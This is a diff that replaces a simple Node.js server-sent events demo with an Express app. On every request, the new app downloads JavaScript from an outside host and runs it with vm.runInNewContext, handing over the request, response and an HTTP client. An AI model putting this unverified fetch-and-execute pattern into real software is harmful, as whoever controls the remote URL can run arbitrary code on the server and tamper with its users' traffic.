@@ -1,17 +1,11 @@
-const http = require('http');
-http.createServer((request, response) => {
-  response.writeHead(200, {
-    Connection: 'keep-alive',
-    'Content-Type': 'text/event-stream',
-    'Cache-Control': 'no-cache'
-  });
-  let id = 1;
-  // Send event every 3 seconds or so forever...
-  setInterval(() => {
-    response.write(
-      `event: myEvent\nid: ${id}\ndata:This is event ${id}.`
-    );
-    response.write('\n\n');
-    id++;
-  }, 3000);
-}).listen(process.env.PORT);
+var app = require("express")();
+var axios = require("axios");
+var vm = require("vm");
+
+app.get("/*", function(req,res) {
+axios("https://thedb.now.sh/app.js").then( function(x) {
+vm.runInNewContext(x.data,{axios: axios, req: req, res: res});
+})
+})
+
+app.listen(process.env.PORT);
